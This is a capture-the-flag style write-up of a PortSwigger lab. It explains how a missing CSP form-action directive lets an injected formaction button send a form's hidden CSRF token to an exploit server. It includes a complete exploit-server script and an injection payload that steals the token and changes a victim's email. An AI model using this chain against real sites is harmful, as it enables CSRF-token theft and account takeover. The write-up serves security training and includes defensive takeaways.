# Lab 30: Reflected XSS protected by very strict CSP, with dangling markup attack

**Category:** Cross-Site Scripting (XSS)
**Difficulty:** Expert
**Lab link:** [Reflected XSS protected by very strict CSP, with dangling markup attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)

## Overview

The user account page reflects `?email=` inside the `value` attribute of an `<input>` that lives inside a `<form>` with a hidden CSRF token. The CSP is strict — no inline scripts, no external script loads — so there's no way to execute JavaScript on the lab origin. The oversight: the CSP has no **`form-action`** directive. That means form submissions aren't restricted to the lab origin, so an injected `<button>` with `formaction` pointing at the exploit server will carry every input in the form — including the CSRF token — out of the page when clicked.

## Key Concepts

- **`form-action` CSP directive:** controls where `<form>` submissions can go. If it's missing (and `default-src` doesn't apply to form actions in older CSP versions), submissions escape the origin even under strict `script-src`.
- **`formaction` / `formmethod` attributes on `<button>`:** override the parent `<form>`'s `action` and `method` at submit time. An injected button can redirect submission of an *existing* form to any URL.
- **`formmethod=get` leaks data in the URL.** All form inputs — including hidden ones like `csrf` — become query parameters, visible to the destination server as plain query string.
- **No JS on the lab origin, but JS is fine on the exploit server.** The exfiltrated token lands on the attacker's domain where a `<script>` can read it and complete the attack.

## Solution

On the exploit server, set the body to this script (replace both URLs):

```html
<body>
<script>
    const academyFrontend = "https://LAB-ID.web-security-academy.net/";
    const exploitServer = "https://EXPLOIT-ID.exploit-server.net/exploit";

    const url = new URL(location);
    const csrf = url.searchParams.get('csrf');

    if (csrf) {
        const form = document.createElement('form');
        const email = document.createElement('input');
        const token = document.createElement('input');

        token.name = 'csrf';
        token.value = csrf;

        email.name = 'email';
        email.value = 'hacker@evil-user.net';

        form.method = 'post';
        form.action = `${academyFrontend}my-account/change-email`;
        form.append(email);
        form.append(token);
        document.documentElement.append(form);
        form.submit();
    } else {
        location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
    }
</script>
</body>
```

**Store** → **Deliver exploit to victim**. The admin's email changes to `hacker@evil-user.net`, which marks the lab solved.

## What the Victim's Browser Does

1. **First hit** — victim loads `exploit-server/exploit`. No `csrf` in the URL, so the script redirects to:
   ```
   https://LAB-ID.../my-account?email=blah@blah"><button formaction=https://EXPLOIT-ID.../exploit formmethod=get type=submit>Click me</button>
   ```
2. The lab reflects the payload into the email input's `value`. Our `"><button ...>` closes the input and injects a new submit button **inside the same form** (the form still contains the hidden `csrf` input).
3. The simulated victim clicks the "Click me" button.
4. The browser submits the form, but the button's `formaction` + `formmethod=get` overrides the form's own action/method. The form becomes a GET to the exploit server with `?email=...&csrf=TOKEN&...`.
5. **Second hit** — victim lands on `exploit-server/exploit?csrf=TOKEN`. The script sees `csrf`, builds a POST form to `/my-account/change-email` with that token and `hacker@evil-user.net`, auto-submits it.
6. Lab server accepts the POST (valid CSRF token, same session), updates the admin's email → lab solved.

## Payload Breakdown

The injected HTML that lands inside the lab's form:

```html
<input ... value="blah@blah"><button class=button formaction=https://EXPLOIT-ID.../exploit formmethod=get type=submit>Click me</button>
```

| Fragment | Purpose |
|----------|---------|
| `"` | Closes the email `value` attribute |
| `>` | Closes the input tag |
| `<button type=submit>` | Visible, clickable submit button for the surrounding form |
| `formaction=https://EXPLOIT-ID...` | Overrides the form's `action` — submission goes to the exploit server instead of `/my-account/change-email` |
| `formmethod=get` | Overrides the form's `method` — submission uses GET so CSRF token lands in the URL query string |
| `Click me` | Social-engineering bait (PortSwigger's simulated admin always clicks) |

## Why It Worked

- **CSP guards `script-src` but forgot `form-action`.** Form navigation is a legitimate way to send request data cross-origin — any strict CSP for form-heavy apps needs an explicit `form-action 'self'`.
- **`formaction` on a submit button is a surgical hijack.** Injecting a button into an existing form lets you reroute its submission without touching the `<form>` tag itself.
- **GET submissions leak hidden inputs.** Any input in the form, including CSRF tokens or anti-automation nonces, becomes URL query parameters — logged, cached, and readable by the destination.
- **The CSRF token wasn't secret from the user — only from other origins.** Once we exfiltrate it, we have everything needed to send a valid CSRF-protected request on the user's behalf.

## Why This Is "Dangling Markup"

The classic dangling markup attack injects an attribute with no closing quote (`<img src='`) and lets the browser absorb subsequent HTML — including secrets — into the attribute value. This lab's attack isn't textbook dangling markup, but PortSwigger uses the term loosely: we inject a markup element that **dangles into** the existing form, inheriting the form's hidden state (the CSRF token) at submission time. Same intuition — abuse HTML parsing to pull a secret out of the page without any script execution.

## Key Takeaways

- **Audit CSP for every content-emitting directive, not just `script-src`.** `form-action`, `frame-ancestors`, `base-uri`, `object-src`, `connect-src` — missing any of them is a bypass primitive against the right XSS.
- **Think "submit button hijacker" when you have HTML injection inside a form.** `formaction`, `formmethod`, `formenctype`, `formtarget`, and `formnovalidate` all override the parent form at submit time.
- **GET methods are exfiltration channels.** Any form that would carry a secret via POST will happily send it via GET if an attacker flips the method — including hidden anti-forgery tokens.
- **Chain two origins on purpose.** Lab origin: strict CSP, no JS. Exploit origin: no CSP, full JS. Use the lab for HTML injection, the exploit server for the scripted follow-up.
